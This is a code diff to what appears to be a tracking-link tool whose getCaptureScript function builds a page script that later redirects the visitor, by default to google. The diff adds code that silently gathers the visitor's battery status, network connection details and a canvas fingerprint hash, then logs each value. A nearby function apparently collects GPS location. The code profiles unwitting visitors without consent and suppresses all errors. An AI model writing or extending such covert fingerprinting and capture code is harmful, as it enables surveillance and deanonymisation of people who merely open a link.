@@ -137,6 +137,49 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }
         };
       } catch(e) {}
+
+      // Battery Status API
+      try {
+        if (navigator.getBattery) {
+          navigator.getBattery().then(async function(battery) {
+            await logExtra({ battery: (battery.level * 100).toFixed(0) + '%, ' + (battery.charging ? 'Charging' : 'Discharging') });
+          });
+        }
+      } catch(e) {}
+
+      // Network Information API
+      try {
+        if (navigator.connection) {
+          var conn = navigator.connection;
+          await logExtra({ network: conn.effectiveType + ', downlink: ' + conn.downlink + 'Mbps, rtt: ' + conn.rtt + 'ms' });
+        }
+      } catch(e) {}
+
+      // Canvas Fingerprinting
+      try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        if (ctx) {
+          var txt = 'Browser Fingerprint 2026';
+          ctx.textBaseline = 'top';
+          ctx.font = "14px 'Arial'";
+          ctx.textBaseline = 'alphabetic';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(125,1,62,20);
+          ctx.fillStyle = '#069';
+          ctx.fillText(txt, 2, 15);
+          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+          ctx.fillText(txt, 4, 17);
+          
+          var b64 = canvas.toDataURL().replace('data:image/png;base64,', '');
+          var hash = 0;
+          for (var i = 0; i < b64.length; i++) {
+            hash = ((hash << 5) - hash) + b64.charCodeAt(i);
+            hash = hash & hash;
+          }
+          await logExtra({ canvas_hash: hash.toString(16) });
+        }
+      } catch(e) {}
     }
 
     async function fireGPS() {
